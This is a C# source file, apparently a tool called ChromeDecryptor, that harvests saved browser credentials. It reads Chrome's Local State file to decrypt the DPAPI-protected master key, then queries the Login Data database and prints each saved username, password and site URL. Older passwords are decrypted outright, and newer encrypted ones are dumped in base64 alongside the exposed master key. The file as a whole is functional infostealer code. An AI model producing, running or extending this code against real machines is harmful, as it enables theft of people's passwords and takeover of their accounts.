using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using ChromeDecryptor.Utilities;
using System.Web.Script.Serialization;

namespace ChromeDecryptor
{
    internal class Program
    {
        static void Main(string[] args)
        {
            var local_appdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string Browser_path = "\\Google\\Chrome\\User Data";

            string login_data = Path.GetFullPath(local_appdata + Browser_path+ "\\Default\\Login data");
            string local_state = Path.GetFullPath(local_appdata + Browser_path + "\\local state");
            
            
            try
            {
                Console.WriteLine(GetMaster(local_state));
                ReadDB(login_data);


            }
            catch (Exception x)
            {

                Console.WriteLine(x.Message);
            }
        }

        static string rawpass;
        static string b64pass;
        static string username;
        static string siteurl;
        
        public static void ReadDB(string DBfile)
        {
            SQLite sqlite = new SQLite(DBfile);
            sqlite.ReadTable("logins");
            Console.WriteLine("username\t\tpassword\t\turl");
            Console.WriteLine("=================================================");

            for (int i = 0; i < sqlite.GetRowCount(); i++)
            {
                
                siteurl = sqlite.GetValue(i, 0);
                username = sqlite.GetValue(i, 3);
                rawpass = sqlite.GetValue(i, 5);

                if (rawpass.StartsWith("v10") || rawpass.StartsWith("v11"))
                    b64pass = "ENC_"+Convert.ToBase64String(Encoding.Default.GetBytes(rawpass));
                else
                {
                    b64pass = Encoding.Default.GetString(DPAPI.Decrypt(Encoding.Default.GetBytes(rawpass)));
                }
                Console.WriteLine(username+":"+ b64pass +":"+siteurl);
                Console.WriteLine();
            }

        }
        public static string GetMaster(string path)
        {
            string key = "";

            string json = File.ReadAllText(path);


            var dict = new JavaScriptSerializer().Deserialize<Dictionary<string, object>>(json);
            if (dict.ContainsKey("os_crypt"))
            {
                var osCrypt = dict["os_crypt"] as Dictionary<string, object>;
                if (osCrypt != null && osCrypt.ContainsKey("encrypted_key"))
                    key = osCrypt["encrypted_key"].ToString();
            }

            byte[] key_bytes = Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(key)).Remove(0, 5));
            byte[] masterKeyBytes = DPAPI.Decrypt(key_bytes);
            return Convert.ToBase64String(masterKeyBytes);

        }
    }
}
